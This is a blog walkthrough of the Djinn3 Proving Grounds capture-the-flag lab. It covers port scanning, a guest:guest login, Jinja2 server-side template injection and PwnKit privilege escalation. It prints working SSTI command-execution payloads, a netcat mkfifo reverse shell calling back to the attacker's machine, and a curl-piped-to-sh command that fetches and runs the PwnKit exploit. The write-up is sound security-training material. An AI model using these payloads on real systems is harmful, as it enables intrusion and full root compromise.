---
title: "Djinn3"
date: 2024-11-25
draft: false
summary: "Writeup for the Djinn3 proving grounds CTF challenge."
tags: ["linux", "suid", "ssti"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/djinn3/cover.webp"
  caption: "Djinn3 Proving Grounds Challenge"
  alt: "Djinn3 cover"
platform: "Misc"
---

**DJinn3** is a CTF challenge on **proving grounds** and requires us to capture 2 flags by hacking into it.
<!--more-->
To access the lab, click on the link given below:
- https://portal.offsec.com/labs/play

## Reconnaissance

I ran an **nmap** aggressive scan on all ports to find information about the target.

```shell
nmap -A -p- TARGET -oN djinn.nmap --min-rate 10000
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |
| 5000     | http        |
| 31337    | unknown     |

![](https://cdn.ziomsec.com/djinn3/1.webp)

![](https://cdn.ziomsec.com/djinn3/2.webp)

## Foothold

The **nmap** scan revealed 4 open ports running different services. I started of with the http server running on port 80 and accessed it on my browser.

![](https://cdn.ziomsec.com/djinn3/3.webp)

I then accessed the server running on port 5000. This page contained hyperlinks and some interesting information about a ticketing system.

![](https://cdn.ziomsec.com/djinn3/4.webp)

I tried accessing port 31337 on the browser but couldn't do so. So I tried accessing it with **nc**. 

![](https://cdn.ziomsec.com/djinn3/5.webp)

```shell
nc TARGET 31337
```

![](https://cdn.ziomsec.com/djinn3/6.webp)

I tried some common credentials like admin, user etc but none of them worked. I read the tickets that were present on port 5000 and found something interesting.

![](https://cdn.ziomsec.com/djinn3/7.webp)

![](https://cdn.ziomsec.com/djinn3/8.webp)

These tickets revealed possible usernames. I tried multiple usernames with common password and ultimately got in using **`guest:guest`**.

![](https://cdn.ziomsec.com/djinn3/9.webp)

This looked like an API that allowed us to work with the tickets that were present on port 5000.

![](https://cdn.ziomsec.com/djinn3/10.webp)

I tried adding a ticket and found it on the server hosted on port 5000.

![](https://cdn.ziomsec.com/djinn3/11.webp)

Even its structure remained the same throughout.

![](https://cdn.ziomsec.com/djinn3/12.webp)

From this, I was able to assume that the api sent the title and description to the backend which was then inserted in a template. Also, the **nmap** scan revealed port 5000 was running **werkzeug** which is a module used with **flask**. **Flask** servers are infamous for being vulnerable to **SSTI** (Server Side Template Injections).

So I added a simple command to check if the application indeed was vulnerable.

```shell
> open
Title: tempinj
Description: {{ 7*7 }}
```

![](https://cdn.ziomsec.com/djinn3/13.webp)

![](https://cdn.ziomsec.com/djinn3/14.webp)

The server executed the command, which confirmed the presence of **SSTI** vulnerability.  Since flask by default uses **jinja2**, I tried a payload specific to that template engine to see if it works.

```shell
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

![](https://cdn.ziomsec.com/djinn3/15.webp)

![](https://cdn.ziomsec.com/djinn3/16.webp)

It worked. So I went to **hacktricks** to look for ways to get RCE and found this payload.

![](https://cdn.ziomsec.com/djinn3/17.webp)

I tried executing the payload first to see if it worked. If it did, I could attempt to get a reverse shell.

```shell
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

![](https://cdn.ziomsec.com/djinn3/18.webp)

![](https://cdn.ziomsec.com/djinn3/19.webp)

The payload was able to execute commands on the server. Hence I used **netcat** **mkfifo** payload to get a reverse shell.

```shell
{{ cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc KALI PORT > /tmp/f').read() }}
```

![](https://cdn.ziomsec.com/djinn3/20.webp)

I opened another ticket with my reverse shell payload and started a listener on another terminal.

![](https://cdn.ziomsec.com/djinn3/21.webp)

Upon visiting the page, I got a reverse shell.

![](https://cdn.ziomsec.com/djinn3/22.webp)

I then found the first flag inside **`/var/www`**.

![](https://cdn.ziomsec.com/djinn3/23.webp)

## Privilege Escalation

I looked for binaries with uncommon suid bit sets and found **pkexec**

```shell
find / -user root -perm -u=s -ls 2>/dev/null
```

![](https://cdn.ziomsec.com/djinn3/24.webp)

When **pkexec** has an **suid bit set**, we can try to escalate our privilege using the PwnKit method. I googled for the exploit and found the github repo.

![](https://cdn.ziomsec.com/djinn3/25.webp)

![](https://cdn.ziomsec.com/djinn3/26.webp)

I downloaded the script on my local machine and then started a python server so that I could transfer it to the target.

```shell
wget "https://raw.githubusercontent.com/ly4k/PwnKit/refs/heads/main/PwnKit.sh"
python3 -m http.server 8080
```

![](https://cdn.ziomsec.com/djinn3/27.webp)

I followed the instructions that were provided on the **github** repo.

![](https://cdn.ziomsec.com/djinn3/28.webp)

```shell
sh -c "$(curl -fsSL http://KALI:8080/PwnKit.sh)"
```

![](https://cdn.ziomsec.com/djinn3/29.webp)

After getting the root shell, I captured the final flag from the **`/root`** directory.

![](https://cdn.ziomsec.com/djinn3/30.webp)

## Closure

Here's a short summary of how I pwned **djinn3**:
- I discovered an **SSTI** vulnerability on the server running on port 5000 and used the api hosted on port 31337 to get a reverse shell.
- I then captured the first flag from the `/var/www` directory.
- I looked for binaries with uncommon **suid bits** and found pkexec.
- I googled for exploits and found the **Pwnkit** repo on github.
- I followed the instructions given in the repo to got root access.
- Finally I captured the root flag from the `/root` directory.

That's it from my side! Until next time :)

---
